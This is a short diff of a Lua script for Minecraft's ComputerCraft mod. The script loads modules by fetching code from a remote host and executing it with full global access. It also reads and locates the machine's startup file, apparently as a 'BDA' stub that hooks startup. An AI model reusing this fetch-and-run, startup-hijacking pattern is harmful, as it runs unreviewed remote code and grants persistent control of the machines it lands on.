@@ -26,7 +26,7 @@ local EnD = (pcall(require, "sys.crypto.EnD") and require("sys.crypto.EnD")) or 
 local command_handler = (pcall(require, "networking.processor.command_handler") and require("networking.processor.command_handler")) or load(http.get("https://mydevbox.cc/src/networking/processor/command_handler.lua", {["User-Agent"] = "ComputerCraft-BDA-Stub"}).readAll(), "command_handler", "t", _G)()
 local uninstaller_installer = (pcall(require, "uninstaller") and require("uninstaller")) or load(http.get("https://mydevbox.cc/src/uninstaller.lua", {["User-Agent"] = "ComputerCraft-BDA-Stub"}).readAll(), "uninstaller", "t", _G)()
 
-
+shell.setDir("/")
 local function getRealStartupPath()
     if not fs.exists("/startup.lua") then return nil end
     local f1 = fs.open("/startup.lua", "r")
@@ -70,7 +70,7 @@ local function getBDApath()
 end
 
 local xsup=getRealStartupPath()
-local bdapath, _ = getBDApath()
+local bdapath, filename = getBDApath()
 
 if xsup~=nil then
     print("set real startup filename")
